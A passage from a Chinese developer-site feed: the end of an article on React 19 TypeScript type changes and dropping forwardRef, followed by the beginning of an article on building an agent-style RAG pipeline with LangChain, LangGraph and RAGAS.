    <span class="hljs-attr">init</span>: <span class="hljs-function">(<span class="hljs-params">i: I</span>) =&gt;</span> S
): [S, <span class="hljs-title class_">ActionDispatch</span>&lt;A&gt;];
</code></pre>
<p>主要区别是，19 把之前的 <code>R</code>（Reducer）拆成了 <code>S</code>（State） 和 <code>A</code>（Action）。</p>
<p>于是之前能跑通的构建失败了：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/734c6273d195443393e8f6b5d86bdd78~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6amz5piv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764592418&amp;x-signature=n4jcFFEqEzRloCRtYzD5Bb7qqCA%3D" alt="" loading="lazy"/></p>
<p>这种情况就得自己改了：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/536c678bd45a4a469975e7dd3b679a50~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6amz5piv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764592418&amp;x-signature=Xb%2BxNGJPK%2BPJGqMokCkfBSHSrt4%3D" alt="" loading="lazy"/></p>
<pre><code class="hljs language-diff" lang="diff"><span class="hljs-deletion">-const [state, dispatch] = useReducer&lt;TModelReducer, null&gt;(reducer, null, createInitialState);</span>
<span class="hljs-addition">+const [state, dispatch] = useReducer&lt;IModelState, null, [TModelAction]&gt;(reducer, null, createInitialState);</span>
</code></pre>
<p>注意，泛型第三个参数必须是元组，需要中括号括起来（个人认为他们可以优化更彻底些，不需要是元组）。</p>
<h3 data-id="heading-5">useRef</h3>
<p><code>useRef</code> 类型定义也变了，<a href="https://link.juejin.cn?target=https%3A%2F%2Freact.dev%2Fblog%2F2024%2F04%2F25%2Freact-19-upgrade-guide%23useref-requires-argument" target="_blank" title="https://react.dev/blog/2024/04/25/react-19-upgrade-guide#useref-requires-argument" ref="nofollow noopener noreferrer">参数变成了必填</a>，也会导致构建失败：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// React 18</span>
<span class="hljs-keyword">function</span> useRef&lt;T&gt;(<span class="hljs-attr">initialValue</span>: T): <span class="hljs-title class_">MutableRefObject</span>&lt;T&gt;;
<span class="hljs-keyword">function</span> useRef&lt;T&gt;(<span class="hljs-attr">initialValue</span>: T | <span class="hljs-literal">null</span>): <span class="hljs-title class_">RefObject</span>&lt;T&gt;;
<span class="hljs-keyword">function</span> useRef&lt;T = <span class="hljs-literal">undefined</span>&gt;(initialValue?: <span class="hljs-literal">undefined</span>): <span class="hljs-title class_">MutableRefObject</span>&lt;T | <span class="hljs-literal">undefined</span>&gt;;
<span class="hljs-comment">// React 19</span>
<span class="hljs-keyword">function</span> useRef&lt;T&gt;(<span class="hljs-attr">initialValue</span>: T): <span class="hljs-title class_">RefObject</span>&lt;T&gt;;  
<span class="hljs-keyword">function</span> useRef&lt;T&gt;(<span class="hljs-attr">initialValue</span>: T | <span class="hljs-literal">null</span>): <span class="hljs-title class_">RefObject</span>&lt;T | <span class="hljs-literal">null</span>&gt;;  
<span class="hljs-keyword">function</span> useRef&lt;T&gt;(<span class="hljs-attr">initialValue</span>: T | <span class="hljs-literal">undefined</span>): <span class="hljs-title class_">RefObject</span>&lt;T | <span class="hljs-literal">undefined</span>&gt;;
</code></pre>
<p>这意味着，需要将所有的空 <code>useRef&lt;T&gt;()</code> 加上默认值，哪怕传的是 <code>undefined</code> 也要写一下。</p>
<p>不过有一个好处，就是以前写成 <code>useRef&lt;T | null&gt;(null)</code> 的，现在只需要写 <code>useRef&lt;T&gt;(null)</code>，见下图 React 18 和 19 下 IDE 类型推导的区别：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ba6ffbde95e14ce196302fa670b4a4fa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6amz5piv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764592418&amp;x-signature=L7Gwf09Lk2Wp8LhZnBZY%2Bqy4GIk%3D" alt="" loading="lazy"/></p>
<p>以前的 <code>RefObject&lt;T&gt;</code> 其实是现在的 <code>RefObject&lt;T | null&gt;</code>，现在的 <code>RefObject&lt;T&gt;</code> 是真的 <code>RefObject&lt;T&gt;</code>。</p>
<h3 data-id="heading-6">Ref 的各种类型</h3>
<p>上面的 <code>useRef</code> 类型定义，你可能已经注意到 <code>MutableRefObject</code> 的地方都被换成了 <code>RefObject</code>。以下是两个版本跟 Ref 有关的类型定义剪影：</p>
<p>React 18：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">RefObject</span>&lt;T&gt; {
  <span class="hljs-keyword">readonly</span> <span class="hljs-attr">current</span>: T | <span class="hljs-literal">null</span>;
}
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">MutableRefObject</span>&lt;T&gt; {
  <span class="hljs-attr">current</span>: T;
}
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Ref</span>&lt;T&gt; = <span class="hljs-title class_">RefCallback</span>&lt;T&gt; | <span class="hljs-title class_">RefObject</span>&lt;T&gt; | <span class="hljs-literal">null</span>;
<span class="hljs-keyword">type</span> <span class="hljs-title class_">ForwardedRef</span>&lt;T&gt; = (<span class="hljs-function">(<span class="hljs-params">instance: T | <span class="hljs-literal">null</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>) | <span class="hljs-title class_">MutableRefObject</span>&lt;T | <span class="hljs-literal">null</span>&gt; | <span class="hljs-literal">null</span>;
</code></pre>
<p>React 19：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">RefObject</span>&lt;T&gt; {
  <span class="hljs-attr">current</span>: T; <span class="hljs-comment">// 🎉 去掉 readonly</span>
}
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">MutableRefObject</span>&lt;T&gt; { <span class="hljs-comment">// 💥 deprecated</span>
  <span class="hljs-attr">current</span>: T;
}
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Ref</span>&lt;T&gt; = <span class="hljs-title class_">RefCallback</span>&lt;T&gt; | <span class="hljs-title class_">RefObject</span>&lt;T | <span class="hljs-literal">null</span>&gt; | <span class="hljs-literal">null</span>;
<span class="hljs-keyword">type</span> <span class="hljs-title class_">ForwardedRef</span>&lt;T&gt; = (<span class="hljs-function">(<span class="hljs-params">instance: T | <span class="hljs-literal">null</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>) | <span class="hljs-title class_">RefObject</span>&lt;T | <span class="hljs-literal">null</span>&gt; | <span class="hljs-literal">null</span>;
</code></pre>
<p>变化：</p>
<ol>
<li><code>RefObject</code> 不再只读（即不再需要 <code>MutableRefObject</code>），可以全局替换 <code>MutableRefObject</code> → <code>RefObject</code></li>
<li><code>ForwardedRef</code> 虽然未标记 <code>deprecated</code>，但从其实现来看，可以全局替换 <code>ForwardedRef</code>→ <code>Ref</code></li>
</ol>
<p>终于不再纠结那么多的 Ref 类型了。</p>
<h2 data-id="heading-7">☄️ 从 useImperativeHandle 再看 forwardRef</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Freact.dev%2Freference%2Freact%2FuseImperativeHandle" target="_blank" title="https://react.dev/reference/react/useImperativeHandle" ref="nofollow noopener noreferrer">useImperativeHandle</a> 是一个可能相对比较冷门的 Hook，但它真的很管用，可以让父组件调用子组件提供的方法，从而避免非常不 React 的写法（比如使用事件通知这种耦合性、不确定性比较强的写法）。</p>
<p>当一个组件复杂到一定程度的时候，为了避免 Props Drilling 的问题，我通常会用 <code>Context</code> 作为组件内全局数据状态管理的工具。所有与 <code>props</code>、<code>state</code>、<code>effect</code> 相关的逻辑通通在一个不涉及 UI 的「Model」层进行封装，UI 与 Model 之间惟一的桥梁就是 Hooks。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/88be0b394a3345ea8b9e353d1d019cef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6amz5piv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764592418&amp;x-signature=66zbvvT0LYegEFFN2yEP%2BQB200A%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-8">React ≤ 18 的绕脑写法</h3>
<p>React 19 之前，这种模式在使用 <code>useImperativeHandle</code> 的时候会写出很绕的代码，为了 <code>ref</code> 能够最终有效，我需要至少写两次 <code>forwardRef</code>，而且比较晦涩，这让我苦不堪言（所以我之前对于写 <code>useImperativeHandle</code> 多少是有些惧怕的）。</p>
<p>React 18 及之前，可能需要这么写。</p>
<p>组件 Model + UI：</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> {
  <span class="hljs-title class_">ReactElement</span>,
  <span class="hljs-title class_">ForwardedRef</span>,
  forwardRef
} <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">import</span> <span class="hljs-title class_">Model</span>, {
  <span class="hljs-title class_">ModelProps</span>,
  <span class="hljs-title class_">ImperativeRef</span>
} <span class="hljs-keyword">from</span> <span class="hljs-string">'../model'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Ui</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'../ui'</span>;
  
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">forwardRef</span>(<span class="hljs-keyword">function</span> <span class="hljs-title function_">TheComponent</span>(<span class="hljs-params">props: ModelProps, ref: ForwardedRef&lt;ImperativeRef&gt;</span>): <span class="hljs-title class_">ReactElement</span> {
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Model</span> {<span class="hljs-attr">...props</span>}&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">Ui</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">{ref}</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">Model</span>&gt;</span></span>;
});
</code></pre>
<p>UI 层：</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> {
  <span class="hljs-title class_">ReactElement</span>,
  <span class="hljs-title class_">ForwardedRef</span>,
  useImperativeHandle,
  forwardRef
} <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">import</span> {  
  <span class="hljs-title class_">ImperativeRef</span>,
  useRefImperative
} <span class="hljs-keyword">from</span> <span class="hljs-string">'../model'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">forwardRef</span>(<span class="hljs-keyword">function</span> <span class="hljs-title function_">Ui</span>(<span class="hljs-params">_props: <span class="hljs-built_in">unknown</span>, ref: ForwardedRef&lt;ImperativeRef&gt;</span>): <span class="hljs-title class_">ReactElement</span> {
  <span class="hljs-keyword">const</span> imperativeRef = <span class="hljs-title function_">useRefImperative</span>();
  
  <span class="hljs-title function_">useImperativeHandle</span>(ref, <span class="hljs-function">() =&gt;</span> imperativeRef, [imperativeRef]);
  
  <span class="hljs-keyword">return</span> <span class="xml">&lt;... /&gt;</span>;
});
</code></pre>
<p>很绕，是不是？需要在组件最外层，把 <code>ref</code> 传递到 UI 层，然后再在 UI 层 <code>useImperativeHandle</code>，为此，原本可以无参的 UI 组件，甚至还要写个 <code>_props: unknown</code>。</p>
<p>但凡脑子不好一点都想不出这么绕的法子 😳。但为了能够在正确的位置使用 <code>useImperativeHandle</code>，这的确是我能想到的比较「高明」的办法了。</p>
<h3 data-id="heading-9">React 19 的写法</h3>
<p>React 19 变得相当简单，<code>forwardRef</code> 全部干掉后，改造 Model 内部的 <code>useRefImperative</code>，使 Model 更内聚：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> {  
  useImperativeHandle  
} <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;  
  
<span class="hljs-keyword">import</span> {  
  <span class="hljs-title class_">IImperativeRef</span>  
} <span class="hljs-keyword">from</span> <span class="hljs-string">'../types'</span>;  
  
<span class="hljs-keyword">import</span> useModelProps <span class="hljs-keyword">from</span> <span class="hljs-string">'./_use-model-props'</span>;  
  
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useRefImperative</span>(<span class="hljs-params"/>): <span class="hljs-built_in">void</span> {  
  <span class="hljs-keyword">const</span> {  
    ref  
  } = <span class="hljs-title function_">useModelProps</span>();  
    
  <span class="hljs-title function_">useImperativeHandle</span>(ref, (): <span class="hljs-function"><span class="hljs-params">IImperativeRef</span> =&gt;</span> ({  
    ...  
  }), [...]);  
}
</code></pre>
<p>使用的话，就只需要在 UI 组件，简单调用一下 <code>useRefImperative</code> 即可：</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> {
  <span class="hljs-title class_">ReactElement</span>
} <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">import</span> {  
  useRefImperative
} <span class="hljs-keyword">from</span> <span class="hljs-string">'../model'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Ui</span>(<span class="hljs-params"/>): <span class="hljs-title class_">ReactElement</span> {
  <span class="hljs-title function_">useRefImperative</span>();
  
  <span class="hljs-keyword">return</span> <span class="xml">&lt;... /&gt;</span>;
});
</code></pre>
<p>至此，我们再也不需要惧怕写 <code>useImperativeHandle</code> 了。</p>
<h2 data-id="heading-10">🐌 组件库怎么办</h2>
<p>React 目前尚未对 <code>forwardRef</code> 标记 <code>deprecated</code>，但也说不久的将来会这么做。</p>
<p>组件库就会比较尴尬，考虑到存量应用，组件库没法在升级 React 19 后直接废弃 <code>forwardRef</code>。也就是说，组件库一时间还没办法享受弃用 <code>forwardRef</code> 的带来的红利，除非组件库启用大版本不兼容升级。</p>
<p>拿 Antd 举例，Antd 5 支持的最小 React 版本是 16.9.0，Antd 6 却并没有直接提升到 React 19，而仅仅声明最小 React 版本是 18。所以，它的实现依然使用了 <code>forwardRef</code>（而且只能用 <code>forwardRef</code>）。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/81b671308c65484bb6f0ce1860aadf2f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6amz5piv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764592418&amp;x-signature=TX0m6bgKcp4FDM6H8YP%2BIPzyFQk%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-11">🪭 总结</h2>
<p>这次的升级，BREAK CHANGE 不多，总的来说比较平滑顺畅，我用了 1 天的时间升级完了五个项目，总结下来就这些：</p>
<ol>
<li>所有的 <code>forwardRef</code> 可以改成 <code>props.ref</code>（如果是 NPM 包，需要先兼容，后发大版本）</li>
<li><code>useReducer</code> 的类型为 BREAK CHANGE，但也只需要改类型，修改相对简单</li>
<li><code>useRef&lt;T&gt;()</code> 传空将导致构建失败，可改成 <code>useRef&lt;T&gt;(null)</code> 或  <code>useRef&lt;T&gt;(undefined)</code></li>
<li><code>MutableRefObject</code> → <code>RefObject</code></li>
<li><code>ForwardedRef</code>→ <code>Ref</code></li>
<li><code>Context.Provider</code>→ <code>Context</code></li>
<li>组件库，除非声明支持最小 React 版本为 19，不要杀 <code>fowardRef</code>（也不要用 <code>props.ref</code>）</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[打造生产级复杂 RAG 系统：LangChain, LangGraph 与 RAGAS 实战指南]]></title>    <link>https://juejin.cn/post/7576129509934530579</link>    <guid>https://juejin.cn/post/7576129509934530579</guid>    <pubDate>2025-11-24T12:38:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576129509934530579" data-draft-id="7576129509934514195" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="打造生产级复杂 RAG 系统：LangChain, LangGraph 与 RAGAS 实战指南"/> <meta itemprop="keywords" content="LangChain,LLM,Agent"/> <meta itemprop="datePublished" content="2025-11-24T12:38:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="AI大模型"/> <meta itemprop="url" content="https://juejin.cn/user/3817967696221534"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            打造生产级复杂 RAG 系统：LangChain, LangGraph 与 RAGAS 实战指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3817967696221534/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    AI大模型
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T12:38:54.000Z" title="Mon Nov 24 2025 12:38:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读18分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>本文较长，建议点赞收藏。更多AI大模型应用开发学习视频及资料，在<a href="https://link.juejin.cn?target=https%3A%2F%2Fhy.zhipoai.cn%2F" target="_blank" title="https://hy.zhipoai.cn/" ref="nofollow noopener noreferrer">智泊AI</a>。</p>
</blockquote>
<p>在构建<strong>生产环境就绪</strong>的 RAG 系统时，我们需要的远不止简单的“检索-生成”步骤。一个健壮的 RAG 必须具备数据治理、灵活的检索策略、<strong>反幻觉 (Anti-Hallucination)</strong>  机制、以及自我优化的<strong>规划与执行 (Planning and Execution)</strong>  能力。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4ffd32e4ceb748c3af5b38ff60e10481~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764592734&amp;x-signature=3LEh7M9WQqatKXtWVqpn%2B%2FpxkU4%3D" alt="" loading="lazy"/></p>
<p>本文将深入探讨如何结合 <strong>LangChain、LangGraph</strong> 和 <strong>RAGAS</strong> 这一套强大的工具链，来搭建一个全栈 RAG 系统。我们将模拟真实世界中的挑战，并提供实用的解决方案。</p>
<blockquote>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FFareedKhan-dev%2Fcomplex-RAG-guide" target="_blank" title="https://github.com/FareedKhan-dev/complex-RAG-guide" ref="nofollow noopener noreferrer">github.com/FareedKhan-…</a></p>
</blockquote>
<h3 data-id="heading-0">步骤1：理解 RAG 管道 (Pipeline)</h3>
<p>在开始编码之前，我们首先需要对这个复杂的 RAG 系统的<strong>核心架构</strong>有一个清晰的认识。我们的系统是一个多步骤的、<strong>基于 Agent 的</strong>循环流程，它通过不断地<strong>规划、执行、反思</strong>来逼近最终答案。</p>
<h4 data-id="heading-1">1. 消除偏差：问题匿名化 (Anonymize Question)</h4>
<ul>
<li><strong>目标：</strong>  防止大型语言模型 (LLM) 依赖其预训练知识中的<strong>固有偏差</strong>或<strong>背景知识</strong>来回答问题，从而强制它<strong>仅依赖</strong>检索到的上下文。</li>
<li><strong>动作：</strong>  系统首先调用 <code>anonymize_question</code>。它会将问题中的特定实体（如“哈利·波特”、“伏地魔”）替换为中性的<strong>占位符</strong>（例如，“人物 X”、“反派 Y”）。</li>
</ul>
<h4 data-id="heading-2">2. 制定策略：高层规划 (Planner)</h4>
<ul>
<li><strong>目标：</strong>  为匿名化后的问题制定一个<strong>高层次、多步骤</strong>的解决策略。</li>
<li><strong>示例：</strong>  对于“人物 X 如何击败反派 Y？”这样的问题，规划器可能会制定如下计划：</li>
</ul>
<ol>
<li>识别人物 X 和反派 Y。</li>
<li>定位他们最终的对峙场景。</li>
<li>分析人物 X 的具体行动。</li>
<li>起草一个完整答案。</li>
</ol>
<h4 data-id="heading-3">3. 工具选择与执行：任务处理层 (Task Handler)</h4>
<p>这是 Agent 的核心<strong>决策点</strong>。<code>task_handler</code> 根据当前任务和已有信息，选择最合适的工具进行<strong>上下文检索</strong>或<strong>直接回答</strong>。可选的工具包括：</p>






























<table><thead><tr><th><strong>工具名称</strong></th><th><strong>作用</strong></th><th><strong>适用场景</strong></th></tr></thead><tbody><tr><td><strong><code>chosen_tool_is_retrieve_quotes</code></strong></td><td>检索<strong>特定的引用</strong>或对话。</td><td>寻找精确的证据或关键台词。</td></tr><tr><td><strong><code>chosen_tool_is_retrieve_chunks</code></strong></td><td>检索<strong>一般性信息</strong>和上下文片段。</td><td>获取背景信息、事件描述。</td></tr><tr><td><strong><code>chosen_tool_is_retrieve_summaries</code></strong></td><td>检索<strong>章节/文档的摘要</strong>。</td><td>快速掌握宏观主题和概要。</td></tr><tr><td><strong><code>chosen_tool_is_answer</code></strong></td><td>当上下文充足时，直接<strong>合成答案</strong>。</td><td>证据链已完整构建。</td></tr></tbody></table>
<h4 data-id="heading-4">4. 自我修正：重规划循环 (Replan Cycle)</h4>
<p>在使用任一检索工具（<code>retrieve_book_quotes</code>、<code>retrieve_chunks</code> 或 <code>retrieve_summaries</code>）获取新信息后，系统进入<strong>反思阶段</strong>：</p>
<ul>
<li><strong><code>replan</code>：</strong>  它接收新的输入，评估当前的进度和预设的目标，然后决定是否需要<strong>更新、扩展</strong>或<strong>修正</strong>原始计划。</li>
<li>这个 <strong><code>task_handler</code> -&gt; <code>tool</code> -&gt; <code>replan</code></strong> 的循环会不断重复，直到系统判断 <code>can_be_answered_already</code> 为真。</li>
</ul>
<h4 data-id="heading-5">5. 最终答案合成与评估</h4>
<ul>
<li><strong><code>get_final_answer</code>：</strong>  一旦退出循环，系统将<strong>综合所有检索到的证据</strong>和中间推理过程，合成一个完整且证据充分的最终响应。</li>
